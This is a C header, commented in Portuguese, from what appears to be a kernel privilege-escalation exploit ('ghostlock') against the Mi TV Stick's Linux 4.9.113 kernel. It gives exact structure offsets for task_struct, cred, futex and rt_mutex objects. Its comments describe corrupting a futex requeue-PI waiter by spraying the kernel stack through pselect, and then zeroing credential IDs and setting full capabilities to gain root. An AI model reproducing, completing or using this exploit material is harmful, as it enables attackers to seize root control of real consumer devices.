/*
 * ghostlock_target.h — aquaman (Mi TV Stick 1080p, 4.9.113 SMP PREEMPT armv8l)
 *
 * FONTE DE TODOS OS OFFSETS: DWARF do build de lab
 *   build-aq/vmlinux  (McMCCRU/linux-amlogic 3d4ab79e, meson64_defconfig + 2
 *   ajustes locais, gcc Linaro 6.3.1 20170109, o MESMO gcc do binario stock)
 *
 * build-aq NAO e o source nem o binario do PI.2055. Todo numero aqui e
 * INFERIDO ate ser validado por leitura em runtime (pos-R/W) ou por
 * calibracao no aparelho. Os numeros sao de um build ARM64 4.9.113 com o
 * mesmo toolchain, entao a geometria e a melhor hipotese disponivel — mas
 * HIPOTESE, nao fato.
 *
 * PROIBIDO copiar numeros de outros devices:
 *   - hazel ARM32 4.9 (mutex +0x18, mm 0x1c0)          -> NAO usado
 *   - aresin 4.14 MTK ARM64 (cred 0x788/0x790)          -> NAO usado
 *
 * Gerar/refresh:
 *   python3 tools/dwarf_offsets.py build-aq/vmlinux
 *   llvm-dwarfdump --debug-info=<die> --show-children build-aq/vmlinux
 */
#ifndef GHOSTLOCK_TARGET_H
#define GHOSTLOCK_TARGET_H

/* ------------------------------------------------------------------ */
/* 0. build / VA                                                       */
/* ------------------------------------------------------------------ */
#define GL_KERNEL_RELEASE        "4.9.113"
#define GL_PAGE_OFFSET           0xffffff8000000000ULL
#define GL_VA_BITS               39
#define GL_PTR_SIZE              8
#define GL_HZ                    300
#define GL_PREEMPT               1

/* lab vmlinux: text em VA39 sem KASLR no objdir; KIMAGE_Z/base sao
 * INFERIDOS para o stock (ver ghostlock-kaslr-symbols.md). */
#define GL_LAB_TEXT_BASE         0xffffff8008000000ULL   /* INFERIDO p/ stock */
#define GL_TEXT_OFF_MAX          0x01000000ULL           /* 16 MB de janela KASLR */

/* ------------------------------------------------------------------ */
/* 1. rt_mutex_waiter — CONFIRMADO pelo DWARF do lab                    */
/*    (rtmutex_common.h, sem CONFIG_DEBUG_RT_MUTEXES)                   */
/* ------------------------------------------------------------------ */
#define GL_RTMW_SIZE             0x50
#define GL_RTMW_TREE_ENTRY       0x00   /* rb_node 0x18 */
#define GL_RTMW_PI_TREE_ENTRY    0x18   /* rb_node 0x18 */
#define GL_RTMW_TASK             0x30   /* struct task_struct * */
#define GL_RTMW_LOCK             0x38   /* struct rt_mutex * */
#define GL_RTMW_PRIO             0x40   /* int  (4B + 4 pad) */
#define GL_RTMW_DEADLINE         0x48   /* u64 */

/* offsets que o walk do kernel realmente toca (rt_mutex_get_effective_prio,
 * rtmutex.c:1405-1425 no lab build):
 *   p->pi_waiters (task+0x7e0)  -> se NULL, caminho rapido, NAO toca o frame
 *   p->pi_waiters_leftmost (0x7e8) = &waiter->pi_tree_entry
 *   *(&waiter->pi_tree_entry + 0x18) == waiter->task   (LEITURA de ponteiro)
 *   waiter->task->prio (task+0x68)                        (LEITURA de int)
 * Consequencia de calibracao: carimbar waiter->task com PAGE_OFFSET da
 * leitura e sempre segura (VA do physmap esta mapeada em qualquer build). */
#define GL_RTMW_TASK_OFF_FROM_PI_ENTRY  0x18

/* ------------------------------------------------------------------ */
/* 2. task_struct — size 0xdc0                                         */
/* ------------------------------------------------------------------ */
#define GL_TASK_SIZE             0xdc0
#define GL_TASK_STATE            0x018
#define GL_TASK_STACK            0x020
#define GL_TASK_PRIO             0x068
#define GL_TASK_STATIC_PRIO      0x06c
#define GL_TASK_NORMAL_PRIO      0x070
#define GL_TASK_POLICY           0x408
#define GL_TASK_TASKS            0x458
#define GL_TASK_MM               0x4a8
#define GL_TASK_EXIT_STATE       0x4f4
#define GL_TASK_PARENT           0x568
#define GL_TASK_THREAD_GROUP     0x600
#define GL_TASK_UTIME            0x638
#define GL_TASK_REAL_CRED        0x708
#define GL_TASK_CRED             0x710
#define GL_TASK_COMM             0x718   /* char[16] */
#define GL_TASK_COMM_LEN         16
#define GL_TASK_FS               0x730
#define GL_TASK_FILES            0x738
#define GL_TASK_BLOCKED          0x758
#define GL_TASK_PENDING          0x770
#define GL_TASK_PI_LOCK          0x7d4   /* raw_spinlock_t */
#define GL_TASK_PI_WAITERS       0x7e0   /* rb_root */
#define GL_TASK_PI_WL            0x7e8   /* struct rt_mutex_waiter * (leftmost) */
#define GL_TASK_PI_BLOCKED_ON    0x7f0   /* struct rt_mutex * */

/* ------------------------------------------------------------------ */
/* 3. cred — size 0xa8, DEBUG_CREDENTIALS unset (aquaman-config)       */
/* ------------------------------------------------------------------ */
#define GL_CRED_SIZE             0xa8
#define GL_CRED_UID              0x04
#define GL_CRED_GID              0x08
#define GL_CRED_SUID             0x0c
#define GL_CRED_SGID             0x10
#define GL_CRED_EUID             0x14
#define GL_CRED_EGID             0x18
#define GL_CRED_FSUID            0x1c
#define GL_CRED_FSGID            0x20
#define GL_CRED_SECUREBITS       0x24
#define GL_CRED_CAP_INHERITABLE  0x28
#define GL_CRED_CAP_PERMITTED    0x30
#define GL_CRED_CAP_EFFECTIVE    0x38
#define GL_CRED_CAP_BSET         0x40
#define GL_CRED_CAP_AMBIENT      0x48
/* 0x04..0x24 = uid,gid,suid,sgid,euid,egid,fsuid,fsgid,securebits = 0x20 bytes.
 * Zera isso = uid/gid 0 e securebits 0 (SEM_CAPS 0 -> deixa caps). Por isso
 * ainda grava CAP_FULL em cap_permitted/cap_effective/cap_bset/cap_ambient. */
#define GL_CRED_IDS_SPAN         0x20
#define GL_CAP_FULL              0x000001ffffffffffULL

/* ------------------------------------------------------------------ */
/* 4. rt_mutex — size 0x20                                             */
/* ------------------------------------------------------------------ */
#define GL_RTMUTEX_SIZE          0x20
#define GL_RTMUTEX_WAIT_LOCK     0x00
#define GL_RTMUTEX_WAITERS       0x08   /* rb_root */
#define GL_RTMUTEX_WAITERS_LEFT  0x10
#define GL_RTMUTEX_OWNER         0x18   /* struct task_struct * */

/* ------------------------------------------------------------------ */
/* 5. futex_q — size 0x70 (so p/ leitura de q->rt_waiter)             */
/* ------------------------------------------------------------------ */
#define GL_FUTEXQ_SIZE           0x70
#define GL_FUTEXQ_LIST           0x00
#define GL_FUTEXQ_TASK           0x28
#define GL_FUTEXQ_LOCK_PTR       0x30
#define GL_FUTEXQ_KEY            0x38
#define GL_FUTEXQ_PI_STATE       0x50
#define GL_FUTEXQ_RT_WAITER      0x58
#define GL_FUTEXQ_REQUEUE_PI_KEY 0x60
#define GL_FUTEXQ_BITSET         0x68

/* ------------------------------------------------------------------ */
/* 6. geometria de frame (LAB, INFERIDO p/ o stock)                    */
/*    Medido por llvm-objdump no vmlinux de lab.                       */
/* ------------------------------------------------------------------ */
/* Cadeia do waiter (frames subtraidos do SP de entrada da syscall):
 *   entry  -> SyS_futex            -0x70  (llvm-objdump SyS_futex @ 0xffffff800913ca30)
 *   SyS_futex -> do_futex          -0x120 (do_futex @ 0xffffff800913bec0)
 *   do_futex -> futex_wait_requeue_pi.constprop.8 -0x1a0 (@ 0xffffff800913b398;
 *     System.map so tem o clone constprop.8 (t); do_futex+0x4b4 @ 0xffffff800913c374
 *     chama o clone direto, sem simbolo plain)
 *   rt_waiter em x29+0x80: DWARF DIE 0x00a9e1d8 (futex.c:2858) DW_OP_fbreg -288,
 *     CFA = x29+0x1a0; asm confirma x2 vias: x21=x29+0x80 @ 0xffffff800913b454
 *     passado como waiter a rt_mutex_finish_proxy_lock @ 0xffffff800913b6d4 e
 *     guardado em q.rt_waiter ([x29,#0x188] = q+0x58) @ 0xffffff800913b4a8
 *   => rt_waiter = SP_ENTRADA_SYSCALL - 0x330 + 0x80 = SP - 0x2b0
 * Re-medido no host em 2026-09-29 (out/logs/frame_reconcile.log): nenhum numero mudou.
 */
#define GL_SPO_ENTER_FUTEX       0x0000UL
#define GL_FRAME_SYF_FUTEX       0x0070
#define GL_FRAME_DO_FUTEX         0x0120
#define GL_FRAME_FWRQ             0x01a0
#define GL_WAITER_OFF_X29         0x0080
/* deslocamento do waiter abaixo do SP de entrada da syscall do waiter */
#define GL_WAITER_OFF_SP         0x02b0UL

/* Cadeia do carimbo (pselect): core_sys_select mantém o array stack_fds no
 * proprio frame, em x29+0x90 (DWARF fs/select.c:561, long[32], DW_OP_fbreg -256,
 * CFA = x29+0x190; asm: add x25,x29,#0x90 @ core_sys_select+0x74 = 0xffffff80092302d4;
 * SyS_pselect6 frame 0x90 @ 0xffffff8009230770, core_sys_select frame 0x190
 * @ 0xffffff8009230260, limite stack/kmalloc cmp size,#0x2a @ 0xffffff80092302cc).
 *   stack_fds[0] = SP_ENTRADA - 0x90 - 0x190 + 0x90 = SP_ENTRADA - 0x190
 *
 * CRUCIAL (medido no asm do lab, core_sys_select+0x6c):
 *     cmp size, #0x2a
 *     b.hi  <caminho kmalloc>
 * ou seja, se `size` (= ((nfds+63)/64)*8) passar de 42 bytes o array vai
 * para kmalloc/vmalloc e NAO toca a stack. pselect(1024,...) nao carimba
 * nada no stack neste kernel. O limite do stack e:
 *     nwords <= 5  =>  nfds <= 320  =>  size = 40 = 0x28
 * 6 slots de 40B = 240B = 0xF0, cabendo em 0x90..0x180 (frame = 0x190).
 *
 * Slots (medido no asm):
 *   [0] rinp   <- copy_from_user( in     )  conteudo do usuario
 *   [1] routp  <- copy_from_user( out    )  conteudo do usuario
 *   [2] rexp   <- copy_from_user( except )  conteudo do usuario
 *   [3] res_in  <- memset(0)
 *   [4] res_out <- memset(0)
 *   [5] res_ex  <- memset(0)
 *
 * Os 3 slots memset(0) sao o problema: waiter->task = 0 => o consumer
 * desreferencia 0x68 => oops. Solucao: segundo pselect 0x78 bytes MAIS
 * RASO, que cobre exatamente [A+0x78, A+0xF0) e restaura o pattern nos
 * slots que o primeiro zerou. Ordem obrigatoria: pselect PROFUNDO primeiro,
 * pselect RASO depois. Resultado: 0xF0 bytes 100% pattern, nenhum zero.
 */
#define GL_FRAME_SPSEL            0x0090
#define GL_FRAME_CSS              0x0190
#define GL_STACK_FDS_OFF_SP       0x0190UL   /* abaixo do SP de entrada */
#define GL_STACK_FDS_SLOTS        6
#define GL_PSEL_MAX_NFDS          320        /* 320 bits -> size 40 */
#define GL_PSEL_SIZE              0x28       /* bytes por fd_set */
#define GL_PSEL_SPAN              (GL_STACK_FDS_SLOTS * GL_PSEL_SIZE) /* 0xf0 */
#define GL_PSEL_SLOT3_OFF         (3 * GL_PSEL_SIZE)                /* 0x78 */

/* PAD do usuario: quantos bytes o carimbo precisa descer na stack do usuario
 * para que stack_fds[0] == &rt_waiter.
 *   SP_psel = SP_futex - PAD
 *   SP_psel - 0x190 == SP_futex - 0x2b0  =>  PAD = 0x2b0 - 0x190 = 0x120
 * Hipotese para o lab. O aparelho pode divergir: e o que a calibracao mede.
 * O alvo util e qualquer PAD em [0x120, 0x120+0xf0-0x50] = [0x120, 0x1c0]
 * (enquanto os 0x50 bytes do waiter caberem dentro da janela de 0xf0).
 * CAVEAT (lido no codigo, sem boot): stamp() aloca VLA de tamanho fixo
 * (MAX_PAD) e so varia o memset len, entao o SP de usuario e identico p/
 * todo PAD e o stack_fds do kernel nao se move (frames fixos, ver acima).
 * A varredura [0x120,0x1c0] foi portanto um no-op; veredito do 0x138 e a
 * proposta do oraculo por valor em reports/ghostlock-value-oracle.md. */
#define GL_PSELECT_SHIFT_LAB      0x0120UL
#define GL_PSELECT_SHIFT_MIN      0x0120UL
#define GL_PSELECT_SHIFT_MAX      0x01c0UL

/* ------------------------------------------------------------------ */
/* 7. mm_struct — size 0x338 (SLUB, cache dedicado "mm_struct")        */
/*    0x338 = 824B -> 4 objetos por pagina de 4K                        */
/* ------------------------------------------------------------------ */
#define GL_MM_SIZE               0x338
#define GL_MM_MMAP               0x000
#define GL_MM_TASK_SIZE          0x030
#define GL_MM_TOTAL_VM           0x0b0
#define GL_MM_START_CODE         0x0e8
#define GL_MM_END_CODE           0x0f0
#define GL_MM_START_DATA         0x0f8
#define GL_MM_END_DATA           0x100
#define GL_MM_START_BRK          0x108
#define GL_MM_BRK                0x110
#define GL_MM_START_STACK        0x118
#define GL_MM_ARG_START          0x120
#define GL_MM_ARG_END            0x128
#define GL_MM_ENV_START          0x130
#define GL_MM_ENV_END            0x138
#define GL_MM_OBJS_PER_PAGE      4
#define GL_MM_CACHE_NAME         "mm_struct"

/* ------------------------------------------------------------------ */
/* 8. configfs_buffer — size 0x60, mutex em +0x20 (LP64)                */
/* ------------------------------------------------------------------ */
#define GL_CFBUF_SIZE            0x60
#define GL_CFBUF_COUNT           0x00   /* loff_t */
#define GL_CFBUF_POS             0x08   /* loff_t */
#define GL_CFBUF_PAGE            0x10   /* struct page * */
#define GL_CFBUF_OPS             0x18   /* struct configfs_buffer_ops * */
#define GL_CFBUF_MUTEX           0x20   /* struct mutex (count=1 => solto) */
#define GL_CFBUF_NEEDS_READ_FILL 0x48
#define GL_CFBUF_READ_IN_PROG    0x4c
#define GL_CFBUF_WRITE_IN_PROG   0x4d
#define GL_CFBUF_BIN_BUFFER      0x50
#define GL_CFBUF_BIN_BUFFER_SZ   0x58
/* rt_mutex embebido em struct mutex: wait_lock u32 @0, waiters rb_root @+4,
 * waiters_leftmost @+0xc, owner @+0x14 */
#define GL_MUTEX_WAIT_LOCK       0x00
#define GL_MUTEX_WAITERS         0x04
#define GL_MUTEX_WAITERS_LEFT    0x0c
#define GL_MUTEX_OWNER           0x14
#define GL_MUTEX_SIZE            0x18   /* struct mutex */

/* ------------------------------------------------------------------ */
/* 9. file_operations — size 0xf0 (VA39 LP64, este 4.9 tem read_iter)   */
/* ------------------------------------------------------------------ */
#define GL_FOPS_SIZE             0xf0
#define GL_FOPS_OWNER            0x00
#define GL_FOPS_LLSEEK           0x08
#define GL_FOPS_READ             0x10
#define GL_FOPS_WRITE            0x18
#define GL_FOPS_READ_ITER        0x20
#define GL_FOPS_WRITE_ITER       0x28
#define GL_FOPS_ITERATE          0x30
#define GL_FOPS_ITERATE_SHARED   0x38
#define GL_FOPS_POLL             0x40
#define GL_FOPS_UNLOCKED_IOCTL   0x48
#define GL_FOPS_COMPAT_IOCTL     0x50
#define GL_FOPS_MMAP             0x58
#define GL_FOPS_OPEN             0x60
#define GL_FOPS_FLUSH            0x68
#define GL_FOPS_RELEASE          0x70

/* ------------------------------------------------------------------ */
/* 10. struct file / files_struct / fdtable                            */
/* ------------------------------------------------------------------ */
#define GL_FILE_SIZE             0x100
#define GL_FILE_F_PATH           0x10
#define GL_FILE_F_OP             0x28
#define GL_FILE_F_POS            0x70
#define GL_FILES_STRUCT_SIZE     0x2c0
#define GL_FILES_COUNT           0x00
#define GL_FILES_FDT             0x20
#define GL_FDTABLE_SIZE          0x38
#define GL_FDTABLE_MAX_FDS       0x00
#define GL_FDTABLE_FD            0x08

/* ------------------------------------------------------------------ */
/* 11. ashmem_area — size 0x138                                        */
/*     name[] ocupa 0x00..0x10f (len 0x10c, padded p/ 0x110)           */
/* ------------------------------------------------------------------ */
#define GL_ASHMEM_AREA_SIZE      0x138
#define GL_ASHMEM_NAME           0x000
#define GL_ASHMEM_NAME_MAX       0x10c   /* 256 + 11 (prefixo) + 1 */
#define GL_ASHMEM_PREFIX         "/dev/ashmem/"
#define GL_ASHMEM_PREFIX_LEN     11
#define GL_ASHMEM_UNPINNED_LIST  0x110
#define GL_ASHMEM_FILE           0x120
#define GL_ASHMEM_SIZE           0x128
#define GL_ASHMEM_PROT_MASK      0x130
#define GL_ASHMEM_DEV            "/dev/ashmem"

/* ------------------------------------------------------------------ */
/* 12. pipe_buffer — size 0x28 (plano B, rota physmap)                 */
/* ------------------------------------------------------------------ */
#define GL_PIPEBUF_SIZE          0x28
#define GL_PIPEBUF_PAGE          0x00   /* struct page * */
#define GL_PIPEBUF_OFFSET        0x08
#define GL_PIPEBUF_LEN           0x0c
#define GL_PIPEBUF_OPS           0x10
#define GL_PIPEBUF_FLAGS         0x18
#define GL_PIPEBUF_PRIVATE       0x20

/* ------------------------------------------------------------------ */
/* 13. config observado no aquaman-config (facts, nao inferencias)     */
/* ------------------------------------------------------------------ */
#define GL_CFG_FUTEX             1
#define GL_CFG_RT_MUTEXES        1
#define GL_CFG_PREEMPT           1
#define GL_CFG_SLUB              1
#define GL_CFG_SLAB_FREELIST_RAND 0
#define GL_CFG_SLUB_DEBUG        0
#define GL_CFG_KASAN             0
#define GL_CFG_HARDENED_USERCOPY 1
#define GL_CFG_DEBUG_RT_MUTEXES  0
#define GL_CFG_DEBUG_CREDENTIALS 0
#define GL_CFG_ASHMEM            1
#define GL_CFG_CONFIGFS          1
#define GL_CFG_UNIX              1
#define GL_CFG_IPV6              1
#define GL_CFG_KALLSYMS_ALL      1
#define GL_CFG_STACKPROTECTOR_STRONG 1

/* ------------------------------------------------------------------ */
/* 14. classificacao de status                                         */
/* ------------------------------------------------------------------ */
#define GL_STATUS_INFERIDO  "INFERIDO (DWARF build-aq, nao binario PI.2055)"
#define GL_STATUS_CONFIRMADO "CONFIRMADO no hardware"

/* boot/sobrevivencia: o consumer chama pthread_setschedparam no waiter, o
 * que entra em rt_mutex_get_effective_prio e le:
 *     task->pi_waiters (0x7e0)            -> NULL?  retorno rapido, frame intocado
 *     task->pi_waiters_leftmost (0x7e8)   -> &waiter->pi_tree_entry (frame)
 *     *(+0x18)                             -> waiter->task      (DESREF!)
 *     waiter->task->prio (0x68)            -> int
 * Se waiter->task == 0 => desref em 0x68 => oops. Nunca carimbar 0.
 * Carimbar com GL_PAGE_OFFSET: VA do physmap, sempre mapeada, leitura segura.
 * Oraculo: waiter->task intacto == thread atual (prio ~120, > 99, caminho
 * "RT" que entra em rt_mutex chain e da o stall de ~60s do baseline);
 * waiter->task carimbado == PAGE_OFFSET (prio lido da RAM fisica, tipicamente
 * 0..255, caminho <99, consumer retorna em microssegundos). */

#endif /* GHOSTLOCK_TARGET_H */
